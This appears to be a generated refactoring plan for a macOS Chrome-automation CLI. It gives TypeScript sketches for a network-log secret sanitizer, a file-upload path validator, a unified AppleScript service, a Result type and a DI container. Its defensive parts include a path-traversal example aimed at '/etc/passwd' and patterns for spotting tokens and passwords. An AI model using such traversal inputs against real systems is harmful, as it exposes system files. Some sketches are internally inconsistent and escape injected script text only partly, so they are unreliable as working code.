# Task Breakdown: Refactoring Architecture and Quality Improvements

Generated: 2025-08-18  
Source: specs/refactor-architecture-quality-improvements.md

## Overview

This task breakdown decomposes the comprehensive refactoring specification into actionable, self-contained tasks that address critical architectural issues, security vulnerabilities, and code quality concerns in the mac-chrome-cli project. The refactoring will improve maintainability, security, and testability while preserving all existing functionality and performance optimizations.

## Critical Issues Being Addressed

1. **Monolithic Architecture**: 887-line CLI entry point violating Single Responsibility Principle
2. **Security Vulnerabilities**: Network monitoring captures sensitive data without sanitization, file upload path traversal risks
3. **Inconsistent Error Handling**: 15+ different result interface patterns creating maintenance burden
4. **Code Duplication**: Three separate AppleScript execution implementations
5. **Testing Gaps**: Integration tests missing critical failure scenarios
6. **Documentation Gaps**: 30-60% JSDoc coverage limiting IDE support

## Phase 1: Critical Security and Architecture (Weeks 1-2)

### Task 1.1: Implement Network Data Sanitization Security
**Description**: Create NetworkDataSanitizer to prevent sensitive data exposure in network monitoring
**Size**: Medium
**Priority**: Critical
**Dependencies**: None
**Can run parallel with**: Task 1.2

**Technical Requirements**:
- Redact authorization headers, passwords, tokens, API keys from network logs
- Support multiple content types (JSON, form data, URL params)
- Configurable sensitive patterns with regex support
- Header and body sanitization with custom replacement text
- Performance optimized for real-time network event processing

**Implementation**:
Create `src/security/DataSanitizer.ts` with complete NetworkDataSanitizer class:

```typescript
// src/security/DataSanitizer.ts
export class NetworkDataSanitizer implements IDataSanitizer {
  private readonly sensitivePatterns = [
    { pattern: /authorization:\s*[^\s,}]+/gi, replacement: 'authorization: [REDACTED]' },
    { pattern: /"password"\s*:\s*"[^"]*"/g, replacement: '"password":"[REDACTED]"' },
    { pattern: /api[_-]?key["\s]*[:=]["\s]*[^",}\s]+/gi, replacement: 'api_key=[REDACTED]' },
    { pattern: /token["\s]*[:=]["\s]*[^",}\s]+/gi, replacement: 'token=[REDACTED]' }
  ];
  
  sanitizeHeaders(headers: Record<string, string>): Record<string, string> {
    const sanitized = { ...headers };
    const sensitiveHeaders = ['authorization', 'cookie', 'x-api-key', 'x-auth-token'];
    
    for (const header of sensitiveHeaders) {
      if (header in sanitized) {
        sanitized[header] = '[REDACTED]';
      }
    }
    return sanitized;
  }
  
  sanitizeBody(body: string, contentType?: string): string {
    let sanitized = body;
    for (const { pattern, replacement } of this.sensitivePatterns) {
      sanitized = sanitized.replace(pattern, replacement);
    }
    return sanitized;
  }
  
  sanitizeUrl(url: string): string {
    try {
      const urlObj = new URL(url);
      const sensitiveParams = ['api_key', 'token', 'auth', 'password'];
      
      for (const param of sensitiveParams) {
        if (urlObj.searchParams.has(param)) {
          urlObj.searchParams.set(param, '[REDACTED]');
        }
      }
      return urlObj.toString();
    } catch {
      return url;
    }
  }
}
```

**Integration Points**:
- Update `src/commands/netlog.ts` to use sanitizer for all captured events
- Integrate with existing network monitoring hook script
- Add sanitization to both request and response data

**Acceptance Criteria**:
- [ ] Sanitizes authorization headers in network logs
- [ ] Redacts password fields in JSON request bodies
- [ ] Removes sensitive URL parameters
- [ ] Handles form-encoded data sanitization
- [ ] Preserves non-sensitive data intact
- [ ] Performance impact < 5% on network monitoring
- [ ] Tests verify all sensitive patterns are caught
- [ ] Integration tests confirm network monitoring still captures required data

### Task 1.2: Implement Secure Path Validator for File Uploads  
**Description**: Create SecurePathValidator to prevent directory traversal attacks in file uploads
**Size**: Medium
**Priority**: Critical
**Dependencies**: None
**Can run parallel with**: Task 1.1

**Technical Requirements**:
- Prevent directory traversal attacks (../../../etc/passwd)
- Restrict file uploads to allowed directories only
- Whitelist approved file extensions
- Normalize and resolve paths before validation
- Support configurable allowed paths and extensions

**Implementation**:
Create `src/security/PathValidator.ts`:

```typescript
// src/security/PathValidator.ts
export class SecurePathValidator {
  private readonly allowedPrefixes = [
    process.env.HOME,
    '/tmp',
    process.cwd()
  ];
  
  private readonly allowedExtensions = ['.pdf', '.doc', '.docx', '.txt', '.png', '.jpg', '.jpeg'];
  
  validateFilePath(inputPath: string): ValidationResult {
    const normalized = path.normalize(path.resolve(inputPath));
    
    // Check for traversal patterns
    if (inputPath.includes('../') || inputPath.includes('..\\')) {
      return ValidationResult.error('Path traversal detected');
    }
    
    // Ensure path is within allowed directories
    const isAllowed = this.allowedPrefixes.some(prefix => 
      normalized.startsWith(path.resolve(prefix))
    );
    
    if (!isAllowed) {
      return ValidationResult.error('Path outside allowed directories');
    }
    
    // Check file extension against whitelist
    const ext = path.extname(normalized).toLowerCase();
    if (!this.allowedExtensions.includes(ext)) {
      return ValidationResult.error(`File type ${ext} not allowed`);
    }
    
    // Verify file exists and is readable
    try {
      const stats = fs.statSync(normalized);
      if (!stats.isFile()) {
        return ValidationResult.error('Path is not a file');
      }
    } catch {
      return ValidationResult.error('File not accessible');
    }
    
    return ValidationResult.ok(normalized);
  }
  
  isSecurePath(filePath: string): boolean {
    return this.validateFilePath(filePath).success;
  }
}
```

**Integration Points**:
- Update `src/commands/files.ts` to use validator before file operations
- Add validation to file upload workflow before AppleScript execution
- Integrate with file system operations throughout codebase

**Acceptance Criteria**:
- [ ] Blocks directory traversal attempts (../../../)
- [ ] Restricts uploads to allowed directories only
- [ ] Validates file extensions against whitelist
- [ ] Handles Windows and Unix path separators
- [ ] Returns clear error messages for violations
- [ ] Performance impact negligible for normal file operations
- [ ] Security tests verify all attack vectors are blocked
- [ ] Integration tests confirm file uploads still work for legitimate files

### Task 1.3: Decompose Monolithic CLI Entry Point
**Description**: Extract 887-line monolithic index.ts into modular CLI architecture with proper separation of concerns
**Size**: Large
**Priority**: High
**Dependencies**: Task 1.1, Task 1.2
**Can run parallel with**: None (blocks other architecture tasks)

**Technical Requirements**:
- Reduce main index.ts to < 50 lines
- Extract command registration into CommandRegistry
- Create MacChromeCLI application class
- Implement OutputFormatter for result handling
- Preserve all existing CLI behavior and options
- Maintain backward compatibility for all commands

**Implementation**:

1. Create `src/cli/Application.ts`:
```typescript
// src/cli/Application.ts
export class MacChromeCLI {
  private readonly container: ServiceContainer;
  private readonly registry: CommandRegistry;
  private readonly formatter: OutputFormatter;
  
  constructor() {
    this.container = new ServiceContainer();
    this.registry = new CommandRegistry(this.container);
    this.formatter = new OutputFormatter();
    this.registerServices();
    this.registerCommands();
  }
  
  async run(argv: string[]): Promise<void> {
    try {
      const result = await this.registry.execute(argv);
      this.formatter.output(result);
    } catch (error) {
      this.handleError(error);
    }
  }
  
  private async registerServices(): Promise<void> {
    // Register all core services
    await this.container.register(TOKENS.AppleScriptService, new AppleScriptService());
    await this.container.register(TOKENS.DataSanitizer, new NetworkDataSanitizer());
    await this.container.register(TOKENS.PathValidator, new SecurePathValidator());
  }
  
  private async registerCommands(): Promise<void> {
    // Register all command handlers
    this.registry.register('doctor', DoctorCommand);
    this.registry.register('snapshot', SnapshotCommand);
    this.registry.register('netlog', NetlogCommand);
    // ... all other commands
  }
  
  private handleError(error: unknown): void {
    const formattedError = this.formatter.formatError(error);
    console.error(formattedError);
    process.exit(1);
  }
}
```

2. Create `src/cli/CommandRegistry.ts`:
```typescript
// src/cli/CommandRegistry.ts
export class CommandRegistry {
  private readonly commands = new Map<string, CommandConstructor>();
  
  constructor(private readonly container: ServiceContainer) {}
  
  register<T extends BaseCommand>(name: string, constructor: CommandConstructor<T>): void {
    this.commands.set(name, constructor);
  }
  
  async execute(argv: string[]): Promise<CommandResult> {
    const program = new Command();
    
    // Configure global options
    program
      .option('--json', 'Output in JSON format')
      .option('--timeout <ms>', 'Command timeout in milliseconds', '30000')
      .option('--out <path>', 'Output file path')
      .option('--preview-max <bytes>', 'Maximum preview size', '1572864');
    
    // Register all commands
    for (const [name, Constructor] of this.commands) {
      const command = new Constructor(this.container);
      command.register(program);
    }
    
    return program.parseAsync(argv);
  }
}
```

3. Create `src/cli/OutputFormatter.ts`:
```typescript
// src/cli/OutputFormatter.ts
export class OutputFormatter {
  output(result: CommandResult): void {
    if (process.argv.includes('--json')) {
      console.log(JSON.stringify(result, null, 2));
    } else {
      this.formatHumanReadable(result);
    }
  }
  
  formatError(error: unknown): string {
    if (error instanceof Error) {
      return `Error: ${error.message}`;
    }
    return `Unknown error: ${String(error)}`;
  }
  
  private formatHumanReadable(result: CommandResult): void {
    // Format result based on command type and content
    if (result.success) {
      console.log(this.formatSuccessResult(result));
    } else {
      console.error(this.formatErrorResult(result));
    }
  }
}
```

4. Update `src/index.ts` to slim entry point:
```typescript
// src/index.ts (reduced from 887 lines to ~20 lines)
import { MacChromeCLI } from './cli/Application.js';

async function main() {
  try {
    const app = new MacChromeCLI();
    await app.run(process.argv);
  } catch (error) {
    console.error('Fatal error:', error);
    process.exit(1);
  }
}

main().catch(console.error);
```

**Acceptance Criteria**:
- [ ] Main index.ts reduced to < 50 lines
- [ ] All CLI commands work identically to before
- [ ] Global options (--json, --timeout, --out, --preview-max) preserved
- [ ] Error handling maintains same behavior
- [ ] Help text and command descriptions unchanged
- [ ] Build and packaging work correctly
- [ ] All existing tests pass without modification
- [ ] TypeScript compilation successful

### Task 1.4: Create Unified AppleScript Service
**Description**: Consolidate three separate AppleScript execution implementations into single service with unified error handling
**Size**: Large  
**Priority**: High
**Dependencies**: Task 1.3
**Can run parallel with**: None

**Technical Requirements**:
- Replace three duplicate AppleScript implementations with single service
- Unified error handling and permission checking
- Consistent caching strategy across all AppleScript operations  
- Standardized result format using Result<T> pattern
- Performance optimization with connection pooling

**Implementation**:
Create unified `src/services/AppleScriptService.ts`:

```typescript
// src/services/AppleScriptService.ts
export class AppleScriptService implements IAppleScriptService {
  constructor(
    private readonly cache: ICacheService,
    private readonly executor: ICommandExecutor,
    private readonly sanitizer: IDataSanitizer
  ) {}
  
  async execute(script: string, options?: ExecutionOptions): Promise<Result<string>> {
    // Check cache first
    const cacheKey = this.generateCacheKey(script, options);
    const cached = await this.cache.get(cacheKey);
    if (cached) return Result.ok(cached);
    
    // Validate permissions
    const permissions = await this.validatePermissions();
    if (!permissions.success) return permissions;
    
    try {
      const result = await this.executor.run('osascript', ['-e', script], {
        timeout: options?.timeout || 5000,
        cwd: options?.cwd,
        env: options?.env
      });
      
      if (result.success) {
        // Cache successful results
        await this.cache.set(cacheKey, result.value.stdout, options?.cacheTTL);
        return Result.ok(result.value.stdout.trim());
      } else {
        return Result.error(this.parseAppleScriptError(result.error), this.getErrorCode(result.error));
      }
    } catch (error) {
      return Result.error(`AppleScript execution failed: ${error}`, ERROR_CODES.UNKNOWN_ERROR);
    }
  }
  
  async executeJavaScript<T>(js: string, context: BrowserContext): Promise<Result<T>> {
    // Validate JavaScript for security
    const validation = await this.sanitizer.sanitizeJavaScript(js, { level: 'strict' });
    if (!validation.success) return validation;
    
    const script = `
      tell application "Google Chrome"
        try
          set targetWindow to window ${context.windowIndex || 1}
          set targetTab to tab ${context.tabIndex || 1} of targetWindow
          set result to execute javascript "${js.replace(/"/g, '\\"')}" in targetTab
          return result as string
        on error errorMessage
          return "ERROR: " & errorMessage
        end try
      end tell
    `;
    
    const result = await this.execute(script, { timeout: 15000 });
    
    if (!result.success) return result;
    
    if (result.value.startsWith('ERROR: ')) {
      const error = result.value.substring(7);
      return Result.error(error, this.getErrorCodeFromMessage(error));
    }
    
    try {
      const parsed = JSON.parse(result.value);
      return Result.ok(parsed);
    } catch {
      return Result.ok(result.value as any);
    }
  }
  
  async validatePermissions(): Promise<Result<PermissionStatus>> {
    const checkScript = `
      tell application "System Events"
        return exists (processes where bundle identifier is "com.google.Chrome")
      end tell
    `;
    
    try {
      const result = await this.executor.run('osascript', ['-e', checkScript], { timeout: 3000 });
      
      if (!result.success) {
        if (result.error.includes('not authorized')) {
          return Result.error('AppleScript automation permission required', ERROR_CODES.PERMISSION_DENIED);
        }
        return Result.error('Permission check failed', ERROR_CODES.UNKNOWN_ERROR);
      }
      
      return Result.ok({
        appleScript: true,
        automation: true,
        screenRecording: true, // Assume granted if AppleScript works
        accessibility: true
      });
    } catch (error) {
      return Result.error(`Permission validation failed: ${error}`, ERROR_CODES.PERMISSION_DENIED);
    }
  }
  
  private generateCacheKey(script: string, options?: ExecutionOptions): string {
    const hash = crypto.createHash('md5').update(script).digest('hex');
    const contextKey = options ? JSON.stringify(options) : '';
    return `applescript:${hash}:${crypto.createHash('md5').update(contextKey).digest('hex').substring(0, 8)}`;
  }
  
  private parseAppleScriptError(error: string): string {
    // Parse common AppleScript error patterns
    if (error.includes('not authorized')) {
      return 'AppleScript automation permission required. Enable in System Preferences > Security & Privacy > Privacy > Automation';
    }
    if (error.includes('Application isn\'t running')) {
      return 'Google Chrome is not running. Please start Chrome and try again.';
    }
    if (error.includes('Invalid index')) {
      return 'Invalid tab or window index. Check that the specified tab/window exists.';
    }
    return error;
  }
  
  private getErrorCode(error: string): ErrorCode {
    if (error.includes('not authorized')) return ERROR_CODES.PERMISSION_DENIED;
    if (error.includes('isn\'t running')) return ERROR_CODES.CHROME_NOT_FOUND;
    if (error.includes('Invalid index')) return ERROR_CODES.TARGET_NOT_FOUND;
    if (error.includes('timeout')) return ERROR_CODES.TIMEOUT;
    return ERROR_CODES.UNKNOWN_ERROR;
  }
}
```

**Files to Update**:
- Remove AppleScript implementations from `src/commands/netlog.ts`
- Remove AppleScript implementations from `src/commands/files.ts`
- Update all commands to use unified AppleScriptService
- Update all existing calls to execChromeJS, execWithTimeout, etc.

**Acceptance Criteria**:
- [ ] All three duplicate AppleScript implementations removed
- [ ] Single AppleScriptService used throughout codebase
- [ ] Error handling consistent across all AppleScript operations
- [ ] Permission checking standardized
- [ ] Caching performance maintained or improved
- [ ] All existing functionality preserved
- [ ] All tests pass with new service
- [ ] No regression in AppleScript execution performance

## Phase 2: Code Quality and Consistency (Weeks 3-4)

### Task 2.1: Implement Unified Result Pattern
**Description**: Replace 15+ different result interfaces with consistent Result<T,E> pattern and backward compatibility adapters
**Size**: Large
**Priority**: High  
**Dependencies**: Task 1.4
**Can run parallel with**: None (blocks other code quality tasks)

**Technical Requirements**:
- Replace all 15+ result interfaces: ExecResult, JSONResult, KeyboardResult, FileUploadResult, UIResult, ScrollResult, SnapshotResult, JavaScriptResult, InputResult, DoctorResult, CoordinateResult, BenchmarkResult, WaitResult, MouseResult, NavigationResult, ScreenshotResult
- Create unified Result<T,E> type with discriminated union
- Implement backward compatibility adapters for existing API
- Add Result utility functions (map, flatMap, chain, etc.)
- Maintain all existing JSON output formats

**Implementation**:

1. Create `src/core/Result.ts`:
```typescript
// src/core/Result.ts
export type Result<T, E = Error> = 
  | { readonly kind: 'ok'; readonly value: T; readonly meta?: Metadata }
  | { readonly kind: 'error'; readonly error: E; readonly code: ErrorCode };

export interface Metadata {
  timestamp?: string;
  executionTime?: number;
  cacheHit?: boolean;
  source?: string;
}

export const Result = {
  ok<T>(value: T, meta?: Metadata): Result<T, never> {
    return { kind: 'ok', value, meta };
  },
  
  error<E>(error: E, code: ErrorCode): Result<never, E> {
    return { kind: 'error', error, code };
  },
  
  map<T, U>(result: Result<T>, fn: (value: T) => U): Result<U> {
    return result.kind === 'ok' 
      ? Result.ok(fn(result.value), result.meta)
      : result;
  },
  
  flatMap<T, U>(result: Result<T>, fn: (value: T) => Result<U>): Result<U> {
    return result.kind === 'ok' ? fn(result.value) : result;
  },
  
  chain<T, U>(result: Result<T>, fn: (value: T) => Result<U>): Result<U> {
    return Result.flatMap(result, fn);
  },
  
  isOk<T>(result: Result<T>): result is { kind: 'ok'; value: T; meta?: Metadata } {
    return result.kind === 'ok';
  },
  
  isError<T>(result: Result<T>): result is { kind: 'error'; error: any; code: ErrorCode } {
    return result.kind === 'error';
  }
};

// Backward compatibility adapters
export function toJSONResult<T>(result: Result<T>): JSONResult<T> {
  return result.kind === 'ok'
    ? { success: true, data: result.value, code: ERROR_CODES.OK, ...(result.meta && { meta: result.meta }) }
    : { success: false, error: String(result.error), code: result.code };
}

export function fromJSONResult<T>(jsonResult: JSONResult<T>): Result<T> {
  return jsonResult.success
    ? Result.ok(jsonResult.data, jsonResult.meta)
    : Result.error(jsonResult.error, jsonResult.code);
}

// Specialized adapters for each legacy interface
export function toMouseResult(result: Result<MouseEventData>): MouseResult {
  return result.kind === 'ok'
    ? { success: true, result: result.value, code: ERROR_CODES.OK }
    : { success: false, error: String(result.error), code: result.code };
}

export function toSnapshotResult(result: Result<SnapshotData>): SnapshotResult {
  return result.kind === 'ok'
    ? { success: true, data: result.value, code: ERROR_CODES.OK }
    : { success: false, error: String(result.error), code: result.code };
}

// ... adapters for all 15+ existing result types
```

2. Update all service interfaces:
```typescript
// Update existing services to use Result<T>
export interface IAppleScriptService {
  execute(script: string, options?: ExecutionOptions): Promise<Result<string>>;
  executeJavaScript<T>(js: string, context: BrowserContext): Promise<Result<T>>;
  validatePermissions(): Promise<Result<PermissionStatus>>;
}

// Update command implementations
export class SnapshotCommand extends BaseCommand<SnapshotOptions, SnapshotData> {
  async execute(options: SnapshotOptions): Promise<Result<SnapshotData>> {
    const validated = this.validator.validate(options);
    if (!validated.success) return Result.error(validated.error, ERROR_CODES.INVALID_INPUT);
    
    return this.appleScript.executeJavaScript(this.buildScript(validated.value));
  }
}
```

3. Create migration utilities:
```typescript
// src/core/ResultMigration.ts
export class ResultMigration {
  static migrateAllResults(codebase: string[]): void {
    // Utility functions for migrating existing code to new Result pattern
    // This would be used during the migration process
  }
  
  static generateAdapters(legacyInterfaces: InterfaceDefinition[]): string {
    // Generate backward compatibility adapters for all legacy interfaces
  }
}
```

**Migration Strategy**:
1. Introduce Result<T> pattern alongside existing interfaces
2. Update internal implementations to use Result<T>
3. Keep backward compatibility adapters for public API
4. Gradually migrate public API consumers
5. Remove legacy interfaces once migration complete

**Acceptance Criteria**:
- [ ] All 15+ result interfaces unified under Result<T> pattern
- [ ] Backward compatibility maintained for existing API consumers
- [ ] JSON output format unchanged for CLI users
- [ ] Result utility functions (map, flatMap, etc.) work correctly
- [ ] Type safety preserved with proper TypeScript types
- [ ] All existing tests pass with new result types
- [ ] Performance impact negligible (< 2% overhead)
- [ ] Migration utilities help convert existing code

### Task 2.2: Implement Dependency Injection Container
**Description**: Create ServiceContainer for IoC with service interfaces to enable easy testing and mocking
**Size**: Large
**Priority**: High
**Dependencies**: Task 2.1
**Can run parallel with**: None

**Technical Requirements**:
- Create ServiceContainer for dependency injection and inversion of control
- Define service interfaces and contracts for all major services
- Update all commands to receive dependencies via constructor injection
- Enable easy mocking for comprehensive testing
- Support singleton and transient service lifetimes
- Provide service lifecycle management (start/stop/dispose)

**Implementation**:

1. Create `src/core/ServiceContainer.ts`:
```typescript
// src/core/ServiceContainer.ts
export class ServiceContainer implements IServiceContainer {
  private readonly services = new Map<ServiceToken<any>, ServiceRegistration<any>>();
  private readonly singletons = new Map<ServiceToken<any>, any>();
  
  async register<T>(
    token: ServiceToken<T>, 
    factory: ServiceFactory<T>,
    options: RegistrationOptions = {}
  ): Promise<Result<void>> {
    try {
      const registration: ServiceRegistration<T> = {
        token,
        factory,
        options: {
          singleton: options.singleton ?? true,
          lazy: options.lazy ?? false,
          autoStart: options.autoStart ?? true,
          dependencies: options.dependencies ?? []
        }
      };
      
      this.services.set(token, registration);
      
      // Auto-start non-lazy services
      if (!registration.options.lazy && registration.options.autoStart) {
        await this.resolve(token);
      }
      
      return Result.ok(void 0);
    } catch (error) {
      return Result.error(`Failed to register service ${token.name}: ${error}`, ERROR_CODES.SERVICE_REGISTRATION_ERROR);
    }
  }
  
  async resolve<T>(token: ServiceToken<T>): Promise<Result<T>> {
    try {
      const registration = this.services.get(token);
      if (!registration) {
        return Result.error(`Service not registered: ${token.name}`, ERROR_CODES.SERVICE_NOT_FOUND);
      }
      
      // Return singleton instance if available
      if (registration.options.singleton && this.singletons.has(token)) {
        return Result.ok(this.singletons.get(token));
      }
      
      // Resolve dependencies first
      const dependencies: any[] = [];
      for (const depToken of registration.options.dependencies) {
        const dep = await this.resolve(depToken);
        if (!dep.success) return dep;
        dependencies.push(dep.value);
      }
      
      // Create service instance
      const instance = await registration.factory.create(this, ...dependencies);
      
      // Cache singleton
      if (registration.options.singleton) {
        this.singletons.set(token, instance);
      }
      
      return Result.ok(instance);
    } catch (error) {
      return Result.error(`Failed to resolve service ${token.name}: ${error}`, ERROR_CODES.SERVICE_RESOLUTION_ERROR);
    }
  }
  
  has<T>(token: ServiceToken<T>): boolean {
    return this.services.has(token);
  }
  
  async startAll(): Promise<Result<void>> {
    try {
      for (const [token, registration] of this.services) {
        if (registration.options.autoStart) {
          const service = await this.resolve(token);
          if (!service.success) return service;
          
          // Start service if it has lifecycle methods
          if (typeof service.value.start === 'function') {
            await service.value.start();
          }
        }
      }
      return Result.ok(void 0);
    } catch (error) {
      return Result.error(`Failed to start services: ${error}`, ERROR_CODES.SERVICE_START_ERROR);
    }
  }
  
  async stopAll(): Promise<Result<void>> {
    try {
      for (const instance of this.singletons.values()) {
        if (typeof instance.stop === 'function') {
          await instance.stop();
        }
      }
      return Result.ok(void 0);
    } catch (error) {
      return Result.error(`Failed to stop services: ${error}`, ERROR_CODES.SERVICE_STOP_ERROR);
    }
  }
}

// Service registration types
export interface ServiceToken<T> {
  readonly name: string;
  readonly type: new (...args: any[]) => T;
}

export interface ServiceFactory<T> {
  create(container: IServiceContainer, ...dependencies: any[]): Promise<T> | T;
}

export interface RegistrationOptions {
  singleton?: boolean;
  lazy?: boolean;
  autoStart?: boolean;
  dependencies?: ServiceToken<any>[];
}
```

2. Define service tokens:
```typescript
// src/core/ServiceTokens.ts
export const TOKENS = {
  AppleScriptService: createToken<IAppleScriptService>('AppleScriptService'),
  DataSanitizer: createToken<IDataSanitizer>('DataSanitizer'),
  PathValidator: createToken<ISecurePathValidator>('PathValidator'),
  CacheService: createToken<ICacheService>('CacheService'),
  CommandExecutor: createToken<ICommandExecutor>('CommandExecutor'),
  ChromeService: createToken<IChromeService>('ChromeService'),
  NetworkService: createToken<INetworkService>('NetworkService'),
  FileService: createToken<IFileService>('FileService')
} as const;

function createToken<T>(name: string): ServiceToken<T> {
  return { name, type: null as any };
}
```

3. Update commands to use dependency injection:
```typescript
// src/commands/base/BaseCommand.ts
export abstract class BaseCommand<TOptions, TResult> {
  constructor(protected readonly container: ServiceContainer) {}
  
  abstract readonly name: string;
  abstract readonly description: string;
  
  abstract validate(options: unknown): Result<TOptions>;
  abstract execute(options: TOptions): Promise<Result<TResult>>;
  
  protected async getService<T>(token: ServiceToken<T>): Promise<T> {
    const result = await this.container.resolve(token);
    if (!result.success) {
      throw new Error(`Failed to resolve service ${token.name}: ${result.error}`);
    }
    return result.value;
  }
}

// Updated command example
export class SnapshotCommand extends BaseCommand<SnapshotOptions, SnapshotData> {
  readonly name = 'snapshot';
  readonly description = 'Capture page structure and interactive elements';
  
  async execute(options: SnapshotOptions): Promise<Result<SnapshotData>> {
    const appleScript = await this.getService(TOKENS.AppleScriptService);
    const validator = await this.getService(TOKENS.InputValidator);
    
    const validated = validator.validate(options, SnapshotSchema);
    if (!validated.success) return validated;
    
    return appleScript.executeJavaScript(this.buildScript(validated.value));
  }
}
```

**Acceptance Criteria**:
- [ ] ServiceContainer manages all service dependencies
- [ ] Commands receive dependencies through constructor injection
- [ ] Service interfaces defined for all major services
- [ ] Singleton and transient service lifetimes supported
- [ ] Service lifecycle management (start/stop) works correctly
- [ ] Easy mocking enabled for comprehensive testing
- [ ] Circular dependency detection prevents infinite loops
- [ ] All existing functionality preserved with new architecture
- [ ] Performance overhead minimal (< 1% impact on command execution)

### Task 2.3: Standardize Error Handling and Context Tracking
**Description**: Unify error codes, messages, and implement error context tracking for better debugging
**Size**: Medium
**Priority**: Medium
**Dependencies**: Task 2.1, Task 2.2
**Can run parallel with**: None

**Technical Requirements**:
- Unify all error codes and messages across the codebase
- Implement error context tracking with stack traces and metadata
- Add error recovery strategies for transient failures
- Enhance error documentation with examples and solutions
- Create error formatting utilities for consistent display

**Implementation**:

1. Enhance error code system:
```typescript
// src/core/ErrorCodes.ts
export const ERROR_CODES = {
  // Success
  OK: 0,
  
  // Input/Validation Errors (10-19)
  INVALID_INPUT: 10,
  INVALID_SELECTOR: 11,
  INVALID_PATH: 12,
  VALIDATION_FAILED: 13,
  
  // Target/Resource Not Found (20-29)
  TARGET_NOT_FOUND: 20,
  ELEMENT_NOT_FOUND: 21,
  TAB_NOT_FOUND: 22,
  WINDOW_NOT_FOUND: 23,
  FILE_NOT_FOUND: 24,
  
  // Permission/Access Errors (30-39)
  PERMISSION_DENIED: 30,
  ACCESS_DENIED: 31,
  AUTHENTICATION_REQUIRED: 32,
  AUTHORIZATION_FAILED: 33,
  
  // Timeout/Performance Errors (40-49)
  TIMEOUT: 40,
  OPERATION_TIMEOUT: 41,
  NETWORK_TIMEOUT: 42,
  
  // Chrome/Browser Errors (50-59)
  CHROME_NOT_FOUND: 50,
  CHROME_NOT_RUNNING: 51,
  CHROME_CONNECTION_FAILED: 52,
  BROWSER_ERROR: 53,
  
  // Service Errors (60-69)
  SERVICE_NOT_FOUND: 60,
  SERVICE_REGISTRATION_ERROR: 61,
  SERVICE_RESOLUTION_ERROR: 62,
  SERVICE_START_ERROR: 63,
  SERVICE_STOP_ERROR: 64,
  
  // System Errors (90-99)
  SYSTEM_ERROR: 90,
  UNKNOWN_ERROR: 99
} as const;

export type ErrorCode = typeof ERROR_CODES[keyof typeof ERROR_CODES];

export interface ErrorInfo {
  code: ErrorCode;
  message: string;
  category: 'input' | 'resource' | 'permission' | 'timeout' | 'browser' | 'service' | 'system';
  recoverable: boolean;
  userAction?: string;
  debugInfo?: string;
}

export const ERROR_INFO: Record<ErrorCode, ErrorInfo> = {
  [ERROR_CODES.PERMISSION_DENIED]: {
    code: ERROR_CODES.PERMISSION_DENIED,
    message: 'Permission denied',
    category: 'permission',
    recoverable: true,
    userAction: 'Grant required permissions in System Preferences > Security & Privacy',
    debugInfo: 'Check macOS privacy settings for Automation and AppleScript'
  },
  
  [ERROR_CODES.CHROME_NOT_RUNNING]: {
    code: ERROR_CODES.CHROME_NOT_RUNNING,
    message: 'Chrome browser is not running',
    category: 'browser',
    recoverable: true,
    userAction: 'Start Google Chrome and try again',
    debugInfo: 'Use "ps aux | grep Chrome" to verify Chrome is running'
  }
  
  // ... all other error codes with detailed info
};
```

2. Create error context system:
```typescript
// src/core/ErrorContext.ts
export interface ErrorContext {
  operation: string;
  input?: unknown;
  timestamp: string;
  stackTrace?: string;
  metadata?: Record<string, unknown>;
  correlationId?: string;
  userId?: string;
}

export class EnhancedError extends Error {
  constructor(
    message: string,
    public readonly code: ErrorCode,
    public readonly context: ErrorContext,
    public readonly originalError?: Error
  ) {
    super(message);
    this.name = 'EnhancedError';
    
    // Preserve stack trace
    if (originalError?.stack) {
      this.stack = originalError.stack;
    } else {
      Error.captureStackTrace(this, EnhancedError);
    }
  }
  
  toJSON(): object {
    return {
      name: this.name,
      message: this.message,
      code: this.code,
      context: this.context,
      stack: this.stack
    };
  }
}

export class ErrorContextBuilder {
  private context: Partial<ErrorContext> = {};
  
  operation(op: string): this {
    this.context.operation = op;
    return this;
  }
  
  input(input: unknown): this {
    this.context.input = input;
    return this;
  }
  
  metadata(meta: Record<string, unknown>): this {
    this.context.metadata = { ...this.context.metadata, ...meta };
    return this;
  }
  
  correlationId(id: string): this {
    this.context.correlationId = id;
    return this;
  }
  
  build(): ErrorContext {
    return {
      ...this.context,
      timestamp: new Date().toISOString(),
      stackTrace: new Error().stack
    } as ErrorContext;
  }
}

// Usage utilities
export function createError(message: string, code: ErrorCode, context: Partial<ErrorContext> = {}): EnhancedError {
  const fullContext = new ErrorContextBuilder()
    .operation(context.operation || 'unknown')
    .input(context.input)
    .metadata(context.metadata)
    .build();
    
  return new EnhancedError(message, code, fullContext);
}

export function wrapError(error: Error, operation: string, additionalContext: Record<string, unknown> = {}): EnhancedError {
  const context = new ErrorContextBuilder()
    .operation(operation)
    .metadata(additionalContext)
    .build();
    
  return new EnhancedError(error.message, ERROR_CODES.UNKNOWN_ERROR, context, error);
}
```

3. Add error recovery strategies:
```typescript
// src/core/ErrorRecovery.ts
export class ErrorRecoveryManager {
  async attemptRecovery(error: EnhancedError): Promise<Result<boolean>> {
    const errorInfo = ERROR_INFO[error.code];
    
    if (!errorInfo.recoverable) {
      return Result.ok(false);
    }
    
    switch (error.code) {
      case ERROR_CODES.CHROME_NOT_RUNNING:
        return this.attemptChromeStartup();
        
      case ERROR_CODES.PERMISSION_DENIED:
        return this.promptForPermissions();
        
      case ERROR_CODES.TIMEOUT:
        return this.retryWithBackoff(error.context);
        
      default:
        return Result.ok(false);
    }
  }
  
  private async attemptChromeStartup(): Promise<Result<boolean>> {
    try {
      // Attempt to start Chrome
      const { spawn } = await import('child_process');
      const chrome = spawn('open', ['-a', 'Google Chrome'], { detached: true });
      chrome.unref();
      
      // Wait for startup
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      return Result.ok(true);
    } catch {
      return Result.ok(false);
    }
  }
  
  private async promptForPermissions(): Promise<Result<boolean>> {
    console.log('🔐 Permission required: Please grant automation permissions to mac-chrome-cli');
    console.log('📖 Instructions: System Preferences > Security & Privacy > Privacy > Automation');
    return Result.ok(false); // User action required
  }
  
  private async retryWithBackoff(context: ErrorContext): Promise<Result<boolean>> {
    // Implement exponential backoff retry logic
    return Result.ok(true);
  }
}
```

**Acceptance Criteria**:
- [ ] All error codes unified and documented with user-friendly messages
- [ ] Error context tracking captures operation details and stack traces
- [ ] Error recovery strategies implemented for common failure scenarios
- [ ] Enhanced error documentation with examples and solutions
- [ ] Error formatting consistent across CLI and JSON outputs
- [ ] Performance impact minimal for normal operation flows
- [ ] Backward compatibility maintained for existing error handling
- [ ] Tests verify all error scenarios and recovery strategies

## Phase 3: Testing and Documentation (Week 5)

### Task 3.1: Implement Comprehensive Failure Scenario Testing
